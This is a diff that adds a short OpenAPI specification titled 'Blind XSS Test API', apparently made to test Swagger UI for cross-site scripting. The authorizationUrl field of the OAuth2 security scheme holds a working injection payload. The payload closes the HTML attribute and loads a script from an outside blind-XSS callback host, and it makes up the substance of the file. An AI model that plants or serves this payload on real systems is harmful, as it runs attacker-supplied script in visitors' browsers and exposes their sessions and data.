@@ -1,0 +1,21 @@
+openapi: 3.0.0
+info:
+  title: Blind XSS Test API
+  description: 'Testing Blind XSS through Swagger UI'
+  version: 1.0.0
+paths:
+  /xss-test:
+    get:
+      summary: Test Blind XSS
+      description: | 
+        This API triggers Blind XSS.
+      responses:
+        '200':
+          description: 'Blind XSS payload triggered'
+components:
+  securitySchemes:
+    XSSAuth:
+      type: oauth2
+      flows:
+        implicit:
+          authorizationUrl: '"><script src=https://xss.report/c/stish834></script>'
